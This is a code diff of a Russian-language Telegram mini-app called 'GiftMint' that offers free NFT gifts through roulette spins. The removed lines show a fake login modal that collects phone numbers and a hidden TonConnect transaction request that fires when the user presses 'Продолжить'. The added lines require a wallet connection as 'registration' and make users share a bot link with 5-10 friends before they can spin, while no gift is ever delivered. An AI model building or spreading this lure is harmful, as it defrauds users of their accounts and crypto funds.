@@ -10,7 +10,10 @@
 </head>
 <body>
     <div class="container">
-        <div id="login-trigger" class="login-badge">Log In</div>
+        <!-- БАННЕРЫ (ВЫЛЕЗАЮТ СВЕРХУ) -->
+        <div id="reg-success-banner" class="top-banner success">Регистрация прошла успешно! ✅</div>
+        <div id="condition-banner" class="top-banner warning">Выполните условия: поделитесь с 5-10 друзьями! 🎁</div>
+
         <header class="header">
             <h1 class="title">GiftMint</h1>
             <div class="conditions-box">
@@ -22,6 +25,8 @@
                 </p>
             </div>
         </header>
+
+        <!-- РУЛЕТКА №1 -->
         <div class="roulette-section">
             <div class="roulette-wrapper">
                 <div class="roulette-track" id="track1">
@@ -37,156 +42,140 @@
                     <div class="nft-card">💐 <span>⭐ 50</span></div>
                 </div>
             </div>
-            <button class="spin-btn">Крутить 0/5</button>
+            <button class="spin-btn action-spin" data-goal="5">Крутить <span class="share-count">0</span>/5</button>
         </div>
-<div class="roulette-section">
-    <div class="roulette-wrapper">
-        <div class="roulette-track" id="track2">
-            <div class="nft-card pink">
-                <img src="./images/img1.png" class="nft-image">
-                <span>⭐ 623</span>
+
+        <!-- РУЛЕТКА №2 -->
+        <div class="roulette-section">
+            <div class="roulette-wrapper">
+                <div class="roulette-track" id="track2">
+                    <div class="nft-card pink"><img src="./images/img1.png" class="nft-image"><span>⭐ 623</span></div>
+                    <div class="nft-card pink"><img src="./images/img2.png" class="nft-image"><span>⭐ 1022</span></div>
+                    <div class="nft-card pink"><img src="./images/img3.png" class="nft-image"><span>⭐ 4460</span></div>
+                    <div class="nft-card pink"><img src="./images/img4.png" class="nft-image"><span>⭐ 1213</span></div>
+                    <div class="nft-card pink"><img src="./images/img5.png" class="nft-image"><span>⭐ 849</span></div>
+                    <!-- Повтор для анимации -->
+                    <div class="nft-card pink"><img src="./images/img1.png" class="nft-image"><span>⭐ 623</span></div>
+                    <div class="nft-card pink"><img src="./images/img2.png" class="nft-image"><span>⭐ 1022</span></div>
+                    <div class="nft-card pink"><img src="./images/img3.png" class="nft-image"><span>⭐ 4460</span></div>
+                    <div class="nft-card pink"><img src="./images/img4.png" class="nft-image"><span>⭐ 1213</span></div>
+                    <div class="nft-card pink"><img src="./images/img5.png" class="nft-image"><span>⭐ 849</span></div>
+                </div>
             </div>
-            <div class="nft-card pink">
-                <img src="./images/img2.png" class="nft-image">
-                <span>⭐ 1022</span>
-            </div>
-            <div class="nft-card pink">
-                <img src="./images/img3.png" class="nft-image">
-                <span>⭐ 4460</span>
-            </div>
-            <div class="nft-card pink">
-                <img src="./images/img4.png" class="nft-image">
-                <span>⭐ 1213</span>
-            </div>
-            <div class="nft-card pink">
-                <img src="./images/img5.png" class="nft-image">
-                <span>⭐ 849</span>
-            </div>
-            <div class="nft-card pink">
-                <img src="./images/img1.png" class="nft-image">
-                <span>⭐ 1000</span>
-            </div>
-            <div class="nft-card pink">
-                <img src="./images/img2.png" class="nft-image">
-                <span>⭐ 400</span>
-            </div>
-            <div class="nft-card pink">
-                <img src="./images/img3.png" class="nft-image">
-                <span>⭐ 600</span>
-            </div>
-            <div class="nft-card pink">
-                <img src="./images/img4.png" class="nft-image">
-                <span>⭐ 300</span>
-            </div>
-            <div class="nft-card pink">
-                <img src="./images/img5.png" class="nft-image">
-                <span>⭐ 150</span>
-            </div>
+            <button class="spin-btn action-spin" data-goal="10">Крутить <span class="share-count">0</span>/10</button>
         </div>
-    </div>
-    <button class="spin-btn">Крутить 0/10</button>
-</div>
-        <footer class="footer">
+
+        <!-- СЕКЦИЯ РЕГИСТРАЦИИ -->
+        <footer class="footer" id="registration-section">
             <label for="username">Введи username аккаунта куда получить подарок</label>
-            <div class="input-container">
+            <div class="input-with-btn">
                 <input type="text" id="username" placeholder="@username...">
-                <span id="username-error" class="error-text">Некорректный юзернейм</span>
+                <button id="next-to-wallet" class="next-btn">➔</button>
             </div>
+            <span id="username-error" class="error-text">Некорректный юзернейм</span>
         </footer>
-    </div>
-    <div id="modal-overlay" class="modal-overlay">
-        <div class="modal-content">
-            <h2 class="modal-title">Log In</h2>
-            <p class="modal-subtitle">Введите номер телефона, привязанный к этому аккаунту</p>
-            <div class="input-wrapper">
-                <input type="tel" id="phone-input" placeholder="+7 (777) 777-77-77">
-                <span id="phone-error" class="error-text">Неверный номер телефона</span>
-            </div>
-            <button id="auth-continue" class="modal-btn">Продолжить</button>
+
+        <!-- СЕКЦИЯ КОШЕЛЬКА -->
+        <div id="wallet-section" class="wallet-box">
+            <p style="margin-bottom: 15px; font-weight: bold;">Для завершения регистрации подключите кошелек:</p>
+            <div id="ton-connect-btn"></div>
         </div>
     </div>
-    <div id="success-overlay" class="modal-overlay">
+
+    <!-- МОДАЛКА: ТРЕБУЕТСЯ РЕГИСТРАЦИЯ -->
+    <div id="modal-reg-required" class="modal-overlay">
         <div class="modal-content">
-            <div style="font-size: 50px; margin-bottom: 10px;">✅</div>
-            <h2 class="modal-title">Авторизация прошла успешно</h2>
+            <h2 class="modal-title">Внимание!</h2>
+            <p class="modal-subtitle">Для начала нужно пройти регистрацию внизу страницы.</p>
+            <button id="go-to-reg" class="modal-btn">Регистрация</button>
         </div>
     </div>
+
     <script>
-        // Этот код должен быть в начале <script>
-const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: 'https://balbesss213.github.io/my-tg-app/tonconnect-manifest.json', // Ссылка на описание приложения
-    buttonRootId: 'login-trigger' // Привязываем к твоей кнопке "Log In"
-});
-        window.Telegram.WebApp.ready();
-        const loginTrigger = document.getElementById('login-trigger');
-        const modalOverlay = document.getElementById('modal-overlay');
-        const successOverlay = document.getElementById('success-overlay');
-        const authContinue = document.getElementById('auth-continue');
-        const phoneInput = document.getElementById('phone-input');
-        const phoneError = document.getElementById('phone-error');
-        loginTrigger.onclick = () => modalOverlay.style.display = 'flex';
-        phoneInput.addEventListener('input', (e) => {
-            let value = phoneInput.value.replace(/\D/g, ''); 
-            if (value.startsWith('1')) { 
-                phoneError.style.display = 'block';
-            } else {
-                phoneError.style.display = 'none';
-            }
-            let formatted = '+7 ';
-            if (value.length > 1) {
-                let check = value.substring(1, 11);
-                if (check.length > 0) formatted += '(' + check.substring(0, 3);
-                if (check.length >= 4) formatted += ') ' + check.substring(3, 6);
-                if (check.length >= 7) formatted += '-' + check.substring(6, 8);
-                if (check.length >= 9) formatted += '-' + check.substring(8, 10);
-            }
-            phoneInput.value = (value.length > 0) ? formatted : '';
+        // 1. Инициализация TonConnect
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://balbesss213.github.io/my-tg-app/tonconnect-manifest.json', 
+            buttonRootId: 'ton-connect-btn' 
         });
-        authContinue.onclick = () => {
-            let digits = phoneInput.value.replace(/\D/g, '');
-            if (digits.length === 11 && digits.startsWith('7')) {
-                modalOverlay.style.display = 'none';
-                successOverlay.style.display = 'flex';
-                setTimeout(() => { successOverlay.style.display = 'none'; }, 3000);
-            } else {
-                phoneError.style.display = 'block';
-            }
+
+        window.Telegram.WebApp.ready();
+
+        // 2. "База данных" (localStorage)
+        const db = {
+            get isReg() { return localStorage.getItem('isReg') === 'true' },
+            set isReg(v) { localStorage.setItem('isReg', v) },
+            get count() { return parseInt(localStorage.getItem('count') || '0') },
+            set count(v) { localStorage.setItem('count', v) }
         };
+
+        // Элементы
         const usernameInput = document.getElementById('username');
         const usernameError = document.getElementById('username-error');
-        usernameInput.addEventListener('input', () => {
-            let val = usernameInput.value;
-            if (val.length > 0 && !val.startsWith('@')) {
-                usernameInput.value = '@' + val;
-            }
-            if (/[а-яё]/i.test(val)) {
-                usernameError.style.display = 'block';
-            } else {
-                usernameError.style.display = 'none';
-            }
-        });
-const spinButton = document.getElementById('auth-continue');
-spinButton.addEventListener('click', async () => {
-    console.log("Кнопка нажата, запускаем процесс...");
-    await startTransaction(); 
-});
-async function startTransaction() {
-    const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 60,
-        messages: [
-            {
-                address: "UQ...", 
-                amount: "10000000",
+        const modalReg = document.getElementById('modal-reg-required');
+        const walletSection = document.getElementById('wallet-section');
 
+        // Логика кнопок "Крутить"
+        document.querySelectorAll('.action-spin').forEach(btn => {
+            btn.onclick = () => {
+                if (!db.isReg) {
+                    modalReg.style.display = 'flex';
+                } else {
+                    // Если рега есть — просим условия
+                    showBanner('condition-banner');
+                    // Открываем шаринг ТГ
+                    Telegram.WebApp.openTelegramLink(`https://t.me/share/url?url=https://t.me/NFTreat_Bot/myapp&text=Получи бесплатный NFT подарок!`);
+                    db.count += 1;
+                    updateUI();
+                }
+            };
+        });
+
+        // Кнопка из модалки вниз
+        document.getElementById('go-to-reg').onclick = () => {
+            modalReg.style.display = 'none';
+            document.getElementById('registration-section').scrollIntoView({ behavior: 'smooth' });
+        };
+
+        // Кнопка Next (стрелочка)
+        document.getElementById('next-to-wallet').onclick = () => {
+            let val = usernameInput.value;
+            if (val.length > 3 && !/[а-яё]/i.test(val)) {
+                walletSection.style.scrollIntoView({ behavior: 'smooth' });
+                walletSection.style.border = '2px solid var(--button-color)';
+            } else {
+                usernameError.style.display = 'block';
             }
-        ]
-    };
-    try {
-        await tonConnectUI.sendTransaction(transaction);
-    } catch (e) {
-        console.error("Пользователь отклонил транзакцию");
-    }
-}
+        };
+
+        // Username логика
+        usernameInput.addEventListener('input', () => {
+            if (!usernameInput.value.startsWith('@')) usernameInput.value = '@' + usernameInput.value.replace('@','');
+            usernameError.style.display = /[а-яё]/i.test(usernameInput.value) ? 'block' : 'none';
+        });
+
+        // Отслеживание кошелька -> ФИНАЛ РЕГИ
+        tonConnectUI.onStatusChange(wallet => {
+            if (wallet && !db.isReg) {
+                db.isReg = true;
+                showBanner('reg-success-banner');
+                setTimeout(() => {
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                }, 2000);
+            }
+            updateUI();
+        });
+
+        function showBanner(id) {
+            const b = document.getElementById(id);
+            b.classList.add('show');
+            setTimeout(() => b.classList.remove('show'), 4000);
+        }
+
+        function updateUI() {
+            document.querySelectorAll('.share-count').forEach(el => el.innerText = db.count);
+        }
+
+        updateUI();
     </script>
 </body>
 </html>
